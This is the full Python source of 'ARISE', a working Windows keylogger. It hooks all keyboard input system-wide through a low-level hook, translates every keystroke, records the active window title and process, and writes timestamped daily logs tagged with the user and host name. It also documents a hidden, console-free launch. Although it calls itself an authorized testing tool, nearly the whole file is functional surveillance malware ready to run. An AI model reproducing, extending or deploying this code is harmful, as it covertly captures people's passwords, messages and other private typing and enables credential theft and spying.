#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
============================================================================
 ARISE - Windows Keylogger (authorized security testing tool)
============================================================================
 Captures global keystrokes via a low-level keyboard hook (WH_KEYBOARD_LL).

 Features
   - Pure Python + ctypes (no third-party dependencies)
   - Full printable-character translation with Shift / CapsLock / AltGr
   - Special-key tokens: [ENTER] [BKSP] [TAB] [DEL] arrows, F1-F12, etc.
   - Active window tracking: logs window title + owning process name
   - Daily rotated log files + live stdout mirroring (--stdout)
   - Clean shutdown: stop-flag file or Ctrl+C, hook always unhooked
   - Optional: ignore injected/synthetic input (--ignore-injected)

 Usage
   python arise.py                        # run with defaults, visible console
   python arise.py --stdout               # also mirror keys to console
   python arise.py --log-dir D:\somewhere # custom log directory
   python arise.py --stop-file C:\x.flag  # custom stop-flag location
   To stop: create the stop-flag file (arise_stop.bat does this) or Ctrl+C.
   Hidden run: use arise_hidden.bat (launches via pythonw.exe, no console).

 NOTE: For use only on systems you are authorized to assess.
============================================================================
"""

import argparse
import ctypes
import ctypes.wintypes as wt
import datetime
import os
import queue
import sys
import threading
import time

# ---------------------------------------------------------------------------
# Windows API bindings
# ---------------------------------------------------------------------------
user32 = ctypes.WinDLL("user32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

# Pointer-sized types (64-bit safe) -- argtypes are set AFTER class defs
if ctypes.sizeof(ctypes.c_void_p) == 8:
    WPARAM = ctypes.c_uint64
    LPARAM = ctypes.c_int64
    LRESULT = ctypes.c_int64
else:
    WPARAM = ctypes.c_uint32
    LPARAM = ctypes.c_int32
    LRESULT = ctypes.c_long

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
WM_SYSKEYDOWN = 0x0104
WM_SYSKEYUP = 0x0105
WM_QUIT = 0x0012
WM_NULL = 0x0000

LLKHF_INJECTED = 0x10
LLKHF_LOWER_IL_INJECTED = 0x02
LLKHF_EXTENDED = 0x01

VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_MENU = 0x12
VK_CAPITAL = 0x14
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_NUMLOCK = 0x90
VK_LSHIFT = 0xA0
VK_RSHIFT = 0xA1
VK_LCONTROL = 0xA2
VK_RCONTROL = 0xA3
VK_LMENU = 0xA4
VK_RMENU = 0xA5

PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
MAX_PATH_W = 1024


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wt.DWORD),
        ("scanCode", wt.DWORD),
        ("flags", wt.DWORD),
        ("time", wt.DWORD),
        ("dwExtraInfo", ctypes.POINTER(wt.ULONG)),
    ]


class MSG(ctypes.Structure):
    _fields_ = [
        ("hwnd", wt.HWND),
        ("message", wt.UINT),
        ("wParam", WPARAM),
        ("lParam", LPARAM),
        ("time", wt.DWORD),
        ("pt", wt.POINT),
    ]


HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, WPARAM, ctypes.c_void_p)

# ---- exact prototypes (prevents 64-bit truncation / OverflowError) ----
user32.SetWindowsHookExW.argtypes = [ctypes.c_int, HOOKPROC,
                                     ctypes.c_void_p, wt.DWORD]
user32.SetWindowsHookExW.restype = ctypes.c_void_p
user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
user32.UnhookWindowsHookEx.restype = wt.BOOL
user32.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int,
                                  WPARAM, LPARAM]
user32.CallNextHookEx.restype = LRESULT
user32.GetMessageW.argtypes = [ctypes.POINTER(MSG), ctypes.c_void_p,
                               wt.UINT, wt.UINT]
user32.GetMessageW.restype = ctypes.c_long
user32.TranslateMessage.argtypes = [ctypes.POINTER(MSG)]
user32.DispatchMessageW.argtypes = [ctypes.POINTER(MSG)]
user32.PostThreadMessageW.argtypes = [wt.DWORD, wt.UINT, WPARAM, LPARAM]
user32.PostThreadMessageW.restype = wt.BOOL
user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
user32.GetAsyncKeyState.restype = ctypes.c_short
user32.GetKeyState.argtypes = [ctypes.c_int]
user32.GetKeyState.restype = ctypes.c_short
user32.ToUnicode.argtypes = [wt.UINT, wt.UINT,
                             ctypes.POINTER(ctypes.c_ubyte),
                             ctypes.c_wchar_p, ctypes.c_int, wt.UINT]
user32.ToUnicode.restype = ctypes.c_int
user32.MapVirtualKeyW.argtypes = [wt.UINT, wt.UINT]
user32.MapVirtualKeyW.restype = wt.UINT
user32.GetForegroundWindow.argtypes = []
user32.GetForegroundWindow.restype = ctypes.c_void_p
user32.GetWindowTextLengthW.argtypes = [ctypes.c_void_p]
user32.GetWindowTextLengthW.restype = ctypes.c_int
user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p,
                                  ctypes.c_int]
user32.GetWindowTextW.restype = ctypes.c_int
user32.GetWindowThreadProcessId.argtypes = [ctypes.c_void_p,
                                            ctypes.POINTER(wt.DWORD)]
kernel32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]
kernel32.CloseHandle.restype = wt.BOOL
kernel32.GetExitCodeProcess.argtypes = [ctypes.c_void_p,
                                        ctypes.POINTER(wt.DWORD)]
kernel32.GetExitCodeProcess.restype = wt.BOOL
kernel32.QueryFullProcessImageNameW.argtypes = [ctypes.c_void_p, wt.DWORD,
                                                ctypes.c_wchar_p,
                                                ctypes.POINTER(wt.DWORD)]
kernel32.QueryFullProcessImageNameW.restype = wt.BOOL
kernel32.GetCurrentThreadId.argtypes = []
kernel32.GetCurrentThreadId.restype = wt.DWORD

# ---------------------------------------------------------------------------
# Key-name tables
# ---------------------------------------------------------------------------
VK_NAMES = {
    0x08: "[BKSP]", 0x09: "[TAB]", 0x0D: "[ENTER]", 0x13: "[PAUSE]",
    0x14: "[CAPSLOCK]", 0x1B: "[ESC]", 0x20: "[SPACE]",
    0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]", 0x24: "[HOME]",
    0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
    0x29: "[SELECT]", 0x2A: "[PRINT]", 0x2B: "[EXEC]", 0x2C: "[PRTSC]",
    0x2D: "[INS]", 0x2E: "[DEL]", 0x2F: "[HELP]",
    0x5B: "[LWIN]", 0x5C: "[RWIN]", 0x5D: "[APPS]",
    0x5F: "[SLEEP]",
    0x6A: "[NUM*]", 0x6B: "[NUM+]", 0x6D: "[NUM-]", 0x6E: "[NUM.]",
    0x6F: "[NUM/]",
    0x90: "[NUMLOCK]", 0x91: "[SCRLOCK]",
    0xA0: "[LSHIFT]", 0xA1: "[RSHIFT]",
    0xA2: "[LCTRL]", 0xA3: "[RCTRL]",
    0xA4: "[LALT]", 0xA5: "[RALT]",
    0xA6: "[BROWSER_BACK]", 0xA7: "[BROWSER_FWD]",
    0xA8: "[BROWSER_REFRESH]", 0xA9: "[BROWSER_STOP]",
    0xAA: "[BROWSER_SEARCH]", 0xAB: "[BROWSER_FAV]",
    0xAC: "[BROWSER_HOME]", 0xAD: "[VOLUME_MUTE]",
    0xAE: "[VOL_DOWN]", 0xAF: "[VOL_UP]",
    0xB0: "[MEDIA_NEXT]", 0xB1: "[MEDIA_PREV]", 0xB2: "[MEDIA_STOP]",
    0xB3: "[MEDIA_PLAY]",
    0xB4: "[MAIL]", 0xB5: "[MEDIA_SELECT]",
    0xBA: None,  # ;: handled by ToUnicode
    0xBB: None,  # =+
    0xBC: None,  # ,<
    0xBD: None,  # -_
    0xBE: None,  # .>
    0xBF: None,  # /?
    0xC0: None,  # `~
    0xDB: None,  # [{
    0xDC: None,  # \|
    0xDD: None,  # ]}
    0xDE: None,  # '"
}
# Function keys F1..F24 (0x70..0x87)
for _i in range(1, 25):
    VK_NAMES[0x6F + _i] = "[F%d]" % _i

MODIFIER_VKS = {VK_SHIFT, VK_CONTROL, VK_MENU, VK_LWIN, VK_RWIN,
                VK_LSHIFT, VK_RSHIFT, VK_LCONTROL, VK_RCONTROL,
                VK_LMENU, VK_RMENU}


def mod_token(vk):
    if vk in (VK_SHIFT, VK_LSHIFT, VK_RSHIFT):
        return "[SHIFT]"
    if vk in (VK_CONTROL, VK_LCONTROL, VK_RCONTROL):
        return "[CTRL]"
    if vk in (VK_MENU, VK_LMENU, VK_RMENU):
        return "[ALT]"
    if vk in (VK_LWIN, VK_RWIN):
        return "[WIN]"
    return None


# ---------------------------------------------------------------------------
# Key translation
# ---------------------------------------------------------------------------
def _build_key_state():
    """Snapshot the live modifier state into a 256-byte keyboard-state array."""
    state = (ctypes.c_ubyte * 256)()
    if user32.GetAsyncKeyState(VK_SHIFT) & 0x8000:
        state[VK_SHIFT] = 0x80
        state[VK_LSHIFT] = 0x80
    if user32.GetAsyncKeyState(VK_CONTROL) & 0x8000:
        state[VK_CONTROL] = 0x80
        state[VK_LCONTROL] = 0x80
    if user32.GetAsyncKeyState(VK_MENU) & 0x8000:
        state[VK_MENU] = 0x80
        state[VK_LMENU] = 0x80
    if user32.GetKeyState(VK_CAPITAL) & 0x0001:
        state[VK_CAPITAL] = 0x01
    return state


def _toucode(vk, scan, state):
    buf = ctypes.create_unicode_buffer(16)
    n = user32.ToUnicode(ctypes.c_uint(vk), ctypes.c_uint(scan),
                         state, buf, 16, 0)
    if n > 0:
        return buf.value[:n]
    if n < 0:
        # Dead key: buffer holds the dead character; emit it once.
        return buf.value[:1]
    return None


def _base_char(vk):
    """Unmodified base character for the key (used in [CTRL+x] notation)."""
    state = (ctypes.c_ubyte * 256)()
    if user32.GetKeyState(VK_CAPITAL) & 0x0001:
        state[VK_CAPITAL] = 0x01
    ch = _toucode(vk, 0, state)
    if ch:
        return ch
    c = user32.MapVirtualKeyW(vk, 2)  # MAPVK_VK_TO_CHAR
    if c:
        return chr(c)
    return None


def translate_key(vk, scan, ctrl_down, alt_down):
    """Return the printable text/token for a key event (None to skip)."""
    # Synthetic Unicode input (SendInput KEYEVENTF_UNICODE, e.g. SendKeys,
    # IME output, RDP) arrives as VK_PACKET with the codepoint in scanCode.
    if vk == 0xE7 and scan:  # VK_PACKET
        try:
            return chr(scan & 0xFFFF)
        except (ValueError, OverflowError):
            pass
    # Keys whose ToUnicode result is a raw control char: use tokens
    if vk == 0x0D:
        return "[ENTER]"
    if vk == 0x09:
        return "[TAB]"
    if vk == 0x20:
        return " "
    # Pure modifier presses
    if vk in MODIFIER_VKS:
        return mod_token(vk)

    # Numpad digits with NumLock off map to nav keys via vkCode already.
    # AltGr (Ctrl+Alt) path first: try full state, accept printable output.
    state = _build_key_state()
    if ctrl_down and alt_down:
        ch = _toucode(vk, scan, state)
        if ch and all(ord(c) >= 0x20 for c in ch):
            return ch  # AltGr character (international layouts)

    if ctrl_down or alt_down:
        base = _base_char(vk)
        mods = []
        if ctrl_down:
            mods.append("CTRL")
        if alt_down:
            mods.append("ALT")
        if base:
            return "[%s+%s]" % ("+".join(mods), base.upper())
        name = VK_NAMES.get(vk)
        return "[%s%s]" % ("+".join(mods) + "+", name) if name else \
            "[CTRL+%02X]" % vk

    # Plain key: try character translation first
    ch = _toucode(vk, scan, state)
    if ch:
        return ch

    # Fallback to special-key token
    name = VK_NAMES.get(vk)
    if name:
        return name
    return "[VK:%02X]" % vk


# ---------------------------------------------------------------------------
# Window / process info
# ---------------------------------------------------------------------------
def get_foreground_window():
    return user32.GetForegroundWindow() or 0


def get_window_title(hwnd):
    if not hwnd:
        return ""
    length = user32.GetWindowTextLengthW(hwnd)
    if length <= 0:
        return ""
    buf = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buf, length + 1)
    return buf.value


_proc_cache = {}


def get_process_name(hwnd):
    pid = wt.DWORD(0)
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    pid = pid.value
    if not pid:
        return "(unknown)"
    if pid in _proc_cache:
        return _proc_cache[pid]
    name = "(unknown)"
    h = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    if h:
        size = wt.DWORD(MAX_PATH_W)
        buf = ctypes.create_unicode_buffer(MAX_PATH_W)
        if kernel32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(size)):
            name = os.path.basename(buf.value)
        kernel32.CloseHandle(h)
    _proc_cache[pid] = name
    return name


# ---------------------------------------------------------------------------
# Arise logger core
# ---------------------------------------------------------------------------
class Arise:
    def __init__(self, log_dir, stop_file, mirror_stdout=False,
                 ignore_injected=False, use_window_titles=True):
        self.log_dir = log_dir
        self.stop_file = stop_file
        self.mirror_stdout = mirror_stdout
        self.ignore_injected = ignore_injected
        self.use_window_titles = use_window_titles

        self.q = queue.Queue()
        self._stop = threading.Event()
        self._writer = None
        self._hook = None
        self._callback = None          # keep-alive ref, prevents GC of hook
        self._hook_thread_id = None
        self._last_hwnd = None
        self._last_date = None
        self._log_path = None

    # ----- logging ----------------------------------------------------
    def _log_path_for(self, when):
        fname = "arise_%s.log" % when.strftime("%Y-%m-%d")
        return os.path.join(self.log_dir, fname)

    def _writer_loop(self):
        """Background thread: drains the event queue into the log file."""
        while not self._stop.is_set():
            try:
                item = self.q.get(timeout=0.5)
            except queue.Empty:
                # periodic stop-flag poll while idle
                if os.path.exists(self.stop_file):
                    self._request_shutdown()
                continue
            if item is None:            # shutdown sentinel
                break
            self._write_line(item)
            # drain everything currently queued
            drained = False
            while True:
                try:
                    item = self.q.get_nowait()
                except queue.Empty:
                    break
                if item is None:
                    drained = True
                    break
                self._write_line(item)
            if drained:
                break
            if os.path.exists(self.stop_file):
                self._request_shutdown()
        self._write_session_end()

    def _write_line(self, text):
        if not text:
            return
        now = datetime.datetime.now()
        path = self._log_path_for(now)
        try:
            with open(path, "a", encoding="utf-8", errors="replace") as f:
                f.write(text)
                f.flush()
        except OSError as e:
            sys.stderr.write("[arise] log write failed: %s\n" % e)
        if self.mirror_stdout:
            try:
                sys.stdout.write(text)
                sys.stdout.flush()
            except Exception:
                pass

    def _session_header(self):
        now = datetime.datetime.now()
        user = os.environ.get("USERNAME", "?")
        host = os.environ.get("COMPUTERNAME", "?")
        return ("=== ARISE session start %s | user=%s host=%s pid=%d ===\n"
                % (now.strftime("%Y-%m-%d %H:%M:%S"), user, host,
                   os.getpid()))

    def _write_session_end(self):
        now = datetime.datetime.now()
        self._write_line("=== ARISE session end %s ===\n"
                         % now.strftime("%Y-%m-%d %H:%M:%S"))

    # ----- hook callback ----------------------------------------------
    def _on_key(self, n_code, w_param, l_param):
        # Never let an exception escape: a callback that does not call
        # CallNextHookEx swallows the keystroke system-wide.
        try:
            if n_code >= 0 and (w_param & 0xFFFFFFFF) in (WM_KEYDOWN,
                                                          WM_SYSKEYDOWN):
                kb = ctypes.cast(l_param,
                                 ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                if not (self.ignore_injected and
                        (kb.flags & LLKHF_INJECTED)):
                    self._process_key(kb.vkCode, kb.scanCode)
        except Exception:
            pass
        return user32.CallNextHookEx(None, n_code, w_param, l_param)

    def _process_key(self, vk, scan):
        ctrl_down = bool(user32.GetAsyncKeyState(VK_CONTROL) & 0x8000)
        alt_down = bool(user32.GetAsyncKeyState(VK_MENU) & 0x8000)
        try:
            text = translate_key(vk, scan, ctrl_down, alt_down)
        except Exception:
            text = "[VK:%02X]" % vk
        if not text:
            return
        stamp = ""
        if self.use_window_titles:
            hwnd = get_foreground_window()
            if hwnd != self._last_hwnd:
                self._last_hwnd = hwnd
                title = get_window_title(hwnd)
                proc = get_process_name(hwnd)
                ts = datetime.datetime.now().strftime("%H:%M:%S")
                stamp = "\n[%s | %s | %s]\n" % (ts, title or "(no title)",
                                                proc)
        self.q.put(stamp + text)

    # ----- lifecycle ----------------------------------------------------
    def _request_shutdown(self):
        if self._stop.is_set():
            return
        self._stop.set()
        if self._hook_thread_id:
            user32.PostThreadMessageW(self._hook_thread_id, WM_QUIT, 0, 0)

    def run(self):
        os.makedirs(self.log_dir, exist_ok=True)
        self._hook_thread_id = kernel32.GetCurrentThreadId()

        # single-instance lock
        lock_path = os.path.join(self.log_dir, "arise.lock")
        self._acquire_lock(lock_path)

        self._write_line(self._session_header())

        # start writer thread
        self._writer = threading.Thread(target=self._writer_loop,
                                        name="arise-writer", daemon=True)
        self._writer.start()

        # install low-level keyboard hook
        self._callback = HOOKPROC(self._on_key)
        self._hook = user32.SetWindowsHookExW(
            WH_KEYBOARD_LL, self._callback, None, 0)
        if not self._hook:
            err = ctypes.get_last_error()
            sys.stderr.write(
                "[arise] SetWindowsHookEx failed, error %d\n" % err)
            self._stop.set()
            self._writer.join(timeout=3)
            return 1

        print("[arise] hook installed (pid %d). Logs: %s"
              % (os.getpid(), self.log_dir))
        print("[arise] stop: create %s or press Ctrl+C"
              % self.stop_file)
        sys.stdout.flush()

        # console Ctrl+C handler -> post WM_QUIT to unblock GetMessageW
        import signal

        def _sigint(_sig, _frm):
            self._request_shutdown()
        signal.signal(signal.SIGINT, _sigint)

        # message pump
        msg = MSG()
        while True:
            r = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            if r == 0:                      # WM_QUIT
                break
            if r == -1:                     # error
                break
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
            # wake-up messages let us poll the stop flag too
            if os.path.exists(self.stop_file):
                self._request_shutdown()
                user32.PostThreadMessageW(self._hook_thread_id, WM_QUIT, 0, 0)

        # cleanup
        if self._hook:
            user32.UnhookWindowsHookEx(self._hook)
            self._hook = None
        self._stop.set()
        self.q.put(None)
        if self._writer and self._writer.is_alive():
            self._writer.join(timeout=5)
        self._release_lock(lock_path)
        print("[arise] stopped cleanly.")
        return 0

    def _acquire_lock(self, lock_path):
        try:
            fd = os.open(lock_path, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
            os.write(fd, str(os.getpid()).encode())
            os.close(fd)
        except OSError:
            # existing lock: check if stale
            try:
                with open(lock_path) as f:
                    old_pid = int(f.read().strip() or 0)
            except (OSError, ValueError):
                old_pid = 0
            alive = False
            if old_pid > 0 and old_pid != os.getpid():
                h = kernel32.OpenProcess(
                    PROCESS_QUERY_LIMITED_INFORMATION, False, old_pid)
                if h:
                    code = wt.DWORD(0)
                    kernel32.GetExitCodeProcess(h, ctypes.byref(code))
                    kernel32.CloseHandle(h)
                    alive = (code.value == 259)  # STILL_ACTIVE
            if alive:
                sys.stderr.write(
                    "[arise] another instance (pid %d) is already running; "
                    "use --force to override\n" % old_pid)
                sys.exit(2)
            try:
                os.remove(lock_path)
            except OSError:
                pass
            try:
                fd = os.open(lock_path,
                             os.O_CREAT | os.O_EXCL | os.O_WRONLY)
                os.write(fd, str(os.getpid()).encode())
                os.close(fd)
            except OSError:
                pass

    def _release_lock(self, lock_path):
        # NOTE: read and CLOSE the file before os.remove -- on Windows,
        # deleting a file you still hold open raises PermissionError.
        try:
            with open(lock_path) as f:
                content = f.read().strip()
            if content == str(os.getpid()):
                os.remove(lock_path)
        except OSError:
            pass


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        prog="arise",
        description="Arise - Windows keylogger (authorized testing tool)")
    script_dir = os.path.dirname(os.path.abspath(__file__))
    ap.add_argument("--log-dir", default=os.path.join(script_dir, "logs"),
                    help="directory for log files (default: ./logs)")
    ap.add_argument("--stop-file",
                    default=os.path.join(script_dir, "arise.stop"),
                    help="stop-flag file path (default: ./arise.stop)")
    ap.add_argument("--stdout", action="store_true",
                    help="mirror captured keys to console")
    ap.add_argument("--ignore-injected", action="store_true",
                    help="ignore SendInput/synthetic keyboard events")
    ap.add_argument("--no-window-titles", action="store_true",
                    help="do not log active window titles")
    ap.add_argument("--force", action="store_true",
                    help="override a stale single-instance lock")
    args = ap.parse_args()

    if args.force:
        lock = os.path.join(args.log_dir, "arise.lock")
        try:
            os.remove(lock)
        except OSError:
            pass

    app = Arise(log_dir=args.log_dir,
                stop_file=args.stop_file,
                mirror_stdout=args.stdout,
                ignore_injected=args.ignore_injected,
                use_window_titles=not args.no_window_titles)
    sys.exit(app.run())


if __name__ == "__main__":
    main()
